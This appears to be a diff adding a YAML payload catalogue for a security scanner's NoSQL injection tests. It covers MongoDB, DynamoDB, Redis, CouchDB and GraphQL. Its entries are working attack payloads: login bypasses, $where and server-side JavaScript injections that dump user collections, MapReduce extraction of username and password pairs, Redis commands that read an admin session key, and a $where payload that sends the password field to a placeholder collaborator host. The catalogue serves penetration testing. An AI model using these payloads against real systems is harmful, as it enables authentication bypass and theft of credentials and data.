@@ -1,0 +1,472 @@
+defaults:
+  vuln_type: nosql
+  encoding: raw
+  source: ensphere
+
+payloads:
+  # ============================================================
+  # MongoDB — operator injection via JSON body
+  # ============================================================
+  - technique: operator_injection
+    injection_surface: json_body
+    evidence_type: boolean_diff
+    risk: 2
+    payload: '{"$gt": ""}'
+    notes: "MongoDB $gt operator. If injected into query filter, matches all non-empty values."
+    tags: [mongodb, operator, gt, confirmation]
+
+  - technique: operator_injection
+    injection_surface: json_body
+    evidence_type: boolean_diff
+    risk: 2
+    payload: '{"$ne": null}'
+    notes: "MongoDB $ne null. Matches all documents where field exists."
+    tags: [mongodb, operator, ne]
+
+  - technique: operator_injection
+    injection_surface: json_body
+    evidence_type: boolean_diff
+    risk: 2
+    payload: '{"$ne": ""}'
+    notes: "MongoDB $ne empty string. Bypasses empty password check."
+    tags: [mongodb, operator, ne, auth_bypass]
+
+  - technique: operator_injection
+    injection_surface: json_body
+    evidence_type: boolean_diff
+    risk: 3
+    payload: '{"$regex": ".*"}'
+    notes: "MongoDB $regex match all. Returns all matching documents."
+    tags: [mongodb, operator, regex]
+
+  - technique: operator_injection
+    injection_surface: json_body
+    evidence_type: boolean_diff
+    risk: 3
+    payload: '{"$regex": "^a"}'
+    notes: "MongoDB $regex prefix match. Iterate chars to extract field values."
+    tags: [mongodb, operator, regex, extraction]
+
+  - technique: operator_injection
+    injection_surface: json_body
+    evidence_type: boolean_diff
+    risk: 2
+    payload: '{"$exists": true}'
+    notes: "MongoDB $exists check. Confirms field presence in collection."
+    tags: [mongodb, operator, exists, probe]
+
+  - technique: operator_injection
+    injection_surface: json_body
+    evidence_type: boolean_diff
+    risk: 2
+    payload: '{"$in": ["admin", "root", "user"]}'
+    notes: "MongoDB $in operator. Tests if field matches common values."
+    tags: [mongodb, operator, in]
+
+  - technique: operator_injection
+    injection_surface: json_body
+    evidence_type: boolean_diff
+    risk: 3
+    payload: '{"$where": "1==1"}'
+    notes: "MongoDB $where with JS expression. Always true — bypasses filters."
+    tags: [mongodb, where, js]
+
+  # ============================================================
+  # MongoDB — $where JavaScript injection
+  # ============================================================
+  - technique: js_injection
+    injection_surface: json_body
+    evidence_type: boolean_diff
+    risk: 3
+    payload: '{"$where": "this.password.length > 0"}'
+    notes: "MongoDB $where JS to probe field existence and content."
+    tags: [mongodb, where, js, extraction]
+
+  - technique: js_injection
+    injection_surface: json_body
+    evidence_type: timing
+    risk: 3
+    payload: '{"$where": "if(this.username==''admin''){sleep(SLEEP_SECONDS*1000)}else{return true}"}'
+    placeholders: [SLEEP_SECONDS]
+    notes: "MongoDB $where time-based blind. Conditional sleep on field value."
+    tags: [mongodb, where, js, sleep, blind]
+
+  - technique: js_injection
+    injection_surface: json_body
+    evidence_type: boolean_diff
+    risk: 3
+    payload: '{"$where": "this.username.match(/^a/)"}'
+    notes: "MongoDB $where regex extraction via JS match."
+    tags: [mongodb, where, js, regex, extraction]
+
+  # ============================================================
+  # MongoDB — query parameter injection (non-JSON)
+  # ============================================================
+  - technique: nosql_injection
+    injection_surface: query
+    evidence_type: boolean_diff
+    risk: 2
+    payload: "[$gt]="
+    notes: "Query param operator injection. Use as: username[$gt]=&password[$gt]="
+    tags: [mongodb, query_param, operator]
+
+  - technique: nosql_injection
+    injection_surface: query
+    evidence_type: boolean_diff
+    risk: 2
+    payload: "[$ne]=invalid"
+    notes: "Query param $ne injection. Matches all docs where field != 'invalid'."
+    tags: [mongodb, query_param, ne]
+
+  - technique: nosql_injection
+    injection_surface: query
+    evidence_type: boolean_diff
+    risk: 3
+    payload: "[$regex]=.*"
+    notes: "Query param $regex wildcard."
+    tags: [mongodb, query_param, regex]
+
+  - technique: nosql_injection
+    injection_surface: query
+    evidence_type: boolean_diff
+    risk: 3
+    payload: "[$regex]=^a"
+    notes: "Query param $regex prefix for extraction."
+    tags: [mongodb, query_param, regex, extraction]
+
+  # ============================================================
+  # MongoDB — authentication bypass patterns
+  # ============================================================
+  - technique: operator_injection
+    injection_surface: json_body
+    evidence_type: boolean_diff
+    risk: 3
+    payload: '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
+    notes: "Full auth bypass payload. Both fields match any non-empty value."
+    tags: [mongodb, auth_bypass, gt]
+
+  - technique: operator_injection
+    injection_surface: json_body
+    evidence_type: boolean_diff
+    risk: 3
+    payload: '{"username": "admin", "password": {"$ne": ""}}'
+    notes: "Target admin account with $ne bypass on password."
+    tags: [mongodb, auth_bypass, ne, admin]
+
+  - technique: operator_injection
+    injection_surface: json_body
+    evidence_type: boolean_diff
+    risk: 3
+    payload: '{"username": {"$regex": "admin"}, "password": {"$ne": ""}}'
+    notes: "Regex match on username + $ne bypass on password."
+    tags: [mongodb, auth_bypass, regex]
+
+  # ============================================================
+  # MongoDB — aggregation pipeline injection
+  # ============================================================
+  - technique: nosql_injection
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 4
+    payload: '[{"$match": {}}, {"$group": {"_id": null, "count": {"$sum": 1}}}]'
+    notes: "Aggregation pipeline injection. Counts all documents in collection."
+    tags: [mongodb, aggregation, enumeration]
+
+  - technique: nosql_injection
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 4
+    payload: '[{"$match": {}}, {"$project": {"_id": 1, "username": 1, "email": 1}}]'
+    notes: "Aggregation pipeline to project specific fields from all documents."
+    tags: [mongodb, aggregation, extraction]
+
+  # ============================================================
+  # MongoDB — aggregation $lookup and $unionWith (cross-collection)
+  # ============================================================
+  - technique: nosql_injection
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 4
+    payload: '[{"$lookup": {"from": "users", "localField": "_id", "foreignField": "_id", "as": "leaked"}}]'
+    notes: "Aggregation $lookup for cross-collection data access. Joins current collection with users collection."
+    tags: [mongodb, aggregation, lookup, cross_collection]
+
+  - technique: nosql_injection
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 4
+    payload: '[{"$unionWith": {"coll": "users"}}, {"$match": {}}]'
+    notes: "Aggregation $unionWith merges all docs from users collection into result set."
+    tags: [mongodb, aggregation, unionwith, cross_collection]
+
+  - technique: nosql_injection
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 4
+    payload: '[{"$lookup": {"from": "admin_settings", "pipeline": [{"$match": {}}], "as": "config"}}, {"$unwind": "$config"}]'
+    notes: "Aggregation $lookup with sub-pipeline to extract all documents from admin_settings collection."
+    tags: [mongodb, aggregation, lookup, pipeline, cross_collection]
+
+  # ============================================================
+  # MongoDB — MapReduce injection
+  # ============================================================
+  - technique: js_injection
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 4
+    payload: '{"mapReduce": "users", "map": "function(){emit(this.username, this.password)}", "reduce": "function(k,v){return v[0]}", "out": {"inline": 1}}'
+    notes: "MongoDB MapReduce injection. Map function emits username/password pairs. Only works if mapReduce command is reachable."
+    tags: [mongodb, mapreduce, extraction, js]
+
+  - technique: js_injection
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 4
+    payload: '{"mapReduce": "users", "map": "function(){emit(1, this)}", "reduce": "function(k,v){return JSON.stringify(v)}", "out": {"inline": 1}}'
+    notes: "MongoDB MapReduce to dump all fields of all documents as JSON."
+    tags: [mongodb, mapreduce, dump, js]
+
+  # ============================================================
+  # MongoDB — URL-encoded operator injection
+  # ============================================================
+  - technique: nosql_injection
+    injection_surface: query
+    encoding: url
+    evidence_type: boolean_diff
+    risk: 2
+    payload: "%5B%24gt%5D="
+    notes: "URL-encoded [$gt]= operator injection."
+    tags: [mongodb, url_encoded, operator]
+
+  - technique: nosql_injection
+    injection_surface: query
+    encoding: url
+    evidence_type: boolean_diff
+    risk: 2
+    payload: "%5B%24ne%5D=invalid"
+    notes: "URL-encoded [$ne] injection."
+    tags: [mongodb, url_encoded, ne]
+
+  # ============================================================
+  # MongoDB — encoded operator variants (unicode / hex)
+  # ============================================================
+  - technique: nosql_injection
+    injection_surface: query
+    encoding: unicode
+    evidence_type: boolean_diff
+    risk: 2
+    payload: "[\\u0024gt]="
+    notes: "Unicode-escaped $ in operator. \\u0024 decodes to $, may bypass string filters."
+    tags: [mongodb, unicode, operator, gt]
+
+  - technique: nosql_injection
+    injection_surface: json_body
+    encoding: unicode
+    evidence_type: boolean_diff
+    risk: 2
+    payload: '{"\u0024ne": ""}'
+    notes: "Unicode-escaped $ne in JSON body. Some JSON parsers decode \\u0024 to $ before query construction."
+    tags: [mongodb, unicode, operator, ne]
+
+  - technique: nosql_injection
+    injection_surface: query
+    encoding: hex
+    evidence_type: boolean_diff
+    risk: 2
+    payload: "[%24gt]="
+    notes: "Hex-encoded $ as %24 within bracket notation. Single-layer encoding variant."
+    tags: [mongodb, hex, operator, gt]
+
+  # ============================================================
+  # MongoDB — header injection
+  # ============================================================
+  - technique: operator_injection
+    injection_surface: header
+    evidence_type: boolean_diff
+    risk: 2
+    payload: '{"$gt": ""}'
+    notes: "NoSQL operator injection via custom header (if header values used in DB queries)."
+    tags: [mongodb, header, operator]
+
+  # ============================================================
+  # MongoDB — cookie / form body variants
+  # ============================================================
+  - technique: operator_injection
+    injection_surface: cookie
+    evidence_type: boolean_diff
+    risk: 2
+    payload: '{"$gt": ""}'
+    notes: "NoSQL operator injection via cookie value."
+    tags: [mongodb, cookie, operator]
+
+  - technique: operator_injection
+    injection_surface: form_body
+    evidence_type: boolean_diff
+    risk: 2
+    payload: "[$gt]="
+    notes: "NoSQL operator injection via form body parameter."
+    tags: [mongodb, form, operator]
+
+  # ============================================================
+  # MongoDB — OOB via $where
+  # ============================================================
+  - technique: js_injection
+    injection_surface: json_body
+    evidence_type: dns_hit
+    risk: 4
+    payload: '{"$where": "function(){var x=new XMLHttpRequest();x.open(''GET'',''http://COLLAB_DOMAIN/''+this.password);x.send();return true}"}'
+    placeholders: [COLLAB_DOMAIN]
+    notes: "MongoDB $where OOB data exfiltration. Only works if XMLHttpRequest is available in the JS context."
+    tags: [mongodb, where, oob, exfiltration]
+
+  # ============================================================
+  # SSJS — Server-Side JavaScript injection
+  # ============================================================
+  - technique: js_injection
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 4
+    payload: "';return JSON.stringify(db.getCollectionNames());//"
+    notes: "SSJS injection to enumerate collection names. Breaks out of string context with quote, returns collection list."
+    tags: [mongodb, ssjs, enumeration]
+
+  - technique: js_injection
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 4
+    payload: "';return JSON.stringify(db.users.find().toArray());//"
+    notes: "SSJS injection to dump users collection. Assumes collection named 'users'."
+    tags: [mongodb, ssjs, dump, users]
+
+  - technique: js_injection
+    injection_surface: json_body
+    evidence_type: timing
+    risk: 3
+    payload: "';sleep(SLEEP_SECONDS*1000);//"
+    placeholders: [SLEEP_SECONDS]
+    notes: "SSJS blind time-based injection. Breaks string context and calls sleep."
+    tags: [mongodb, ssjs, blind, sleep]
+
+  - technique: js_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    payload: "1;return db.version();//"
+    notes: "SSJS injection via query parameter. Returns MongoDB server version."
+    tags: [mongodb, ssjs, version, probe]
+
+  # ============================================================
+  # DynamoDB — condition expression injection
+  # ============================================================
+  - technique: nosql_injection
+    injection_surface: json_body
+    evidence_type: boolean_diff
+    risk: 3
+    payload: "attribute_exists(password)"
+    notes: "DynamoDB condition expression injection. Tests if attribute exists."
+    tags: [dynamodb, condition, probe]
+
+  - technique: nosql_injection
+    injection_surface: json_body
+    evidence_type: boolean_diff
+    risk: 3
+    payload: "begins_with(password, :prefix)"
+    notes: "DynamoDB begins_with for prefix extraction."
+    tags: [dynamodb, condition, extraction]
+
+  - technique: nosql_injection
+    injection_surface: json_body
+    evidence_type: boolean_diff
+    risk: 3
+    payload: "attribute_type(password, :type) OR attribute_exists(secret_key)"
+    notes: "DynamoDB OR condition to probe multiple attributes. Tests password type or secret_key existence."
+    tags: [dynamodb, condition, or, probe]
+
+  - technique: nosql_injection
+    injection_surface: json_body
+    evidence_type: boolean_diff
+    risk: 3
+    payload: "contains(password, :substring)"
+    notes: "DynamoDB contains function for substring extraction of attribute values."
+    tags: [dynamodb, condition, contains, extraction]
+
+  - technique: nosql_injection
+    injection_surface: json_body
+    evidence_type: boolean_diff
+    risk: 3
+    payload: "size(password) > :len"
+    notes: "DynamoDB size() condition to determine attribute value length for iterative extraction."
+    tags: [dynamodb, condition, size, extraction]
+
+  # ============================================================
+  # Redis — injection patterns (EVAL Lua scripts)
+  # ============================================================
+  - technique: nosql_injection
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 4
+    payload: "EVAL \"return redis.call('INFO')\" 0"
+    notes: "Redis EVAL Lua injection. Returns server info including version, memory, connected clients."
+    tags: [redis, eval, lua, info]
+
+  - technique: nosql_injection
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 4
+    payload: "EVAL \"return redis.call('KEYS','*')\" 0"
+    notes: "Redis EVAL Lua to enumerate all keys. Returns list of all key names."
+    tags: [redis, eval, lua, keys, enumeration]
+
+  - technique: nosql_injection
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 4
+    payload: "EVAL \"return redis.call('GET','session:admin')\" 0"
+    notes: "Redis EVAL Lua to read a specific session key. Targets admin session token."
+    tags: [redis, eval, lua, session, extraction]
+
+  - technique: nosql_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 4
+    payload: "\r\nKEYS *\r\n"
+    notes: "Redis CRLF injection. Injects raw KEYS command via protocol smuggling."
+    tags: [redis, crlf, keys, enumeration]
+
+  # ============================================================
+  # CouchDB — injection patterns
+  # ============================================================
+  - technique: nosql_injection
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: '{"selector": {"_id": {"$gt": null}}, "fields": ["_id", "_rev", "username", "password"]}'
+    notes: "CouchDB Mango query injection. Selects all documents and projects sensitive fields."
+    tags: [couchdb, mango, selector, extraction]
+
+  - technique: nosql_injection
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: '{"selector": {"password": {"$regex": ".*"}}, "limit": 999}'
+    notes: "CouchDB Mango $regex to match all passwords. High limit to dump entire collection."
+    tags: [couchdb, mango, regex, dump]
+
+  # ============================================================
+  # GraphQL + NoSQL injection combos
+  # ============================================================
+  - technique: operator_injection
+    injection_surface: json_body
+    evidence_type: boolean_diff
+    risk: 3
+    payload: '{"query": "query { user(filter: {username: {$ne: null}}) { id username email } }"}'
+    notes: "GraphQL query with embedded NoSQL operator in filter argument. Bypasses authentication if filter is passed to MongoDB."
+    tags: [graphql, mongodb, operator, ne]
+
+  - technique: operator_injection
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: '{"query": "query { users(where: {password_not: \"\"}) { id username password } }"}'
+    notes: "GraphQL + Prisma/Mongoose style _not filter. If ORM translates to $ne, returns all users with passwords."
+    tags: [graphql, mongodb, operator, orm]
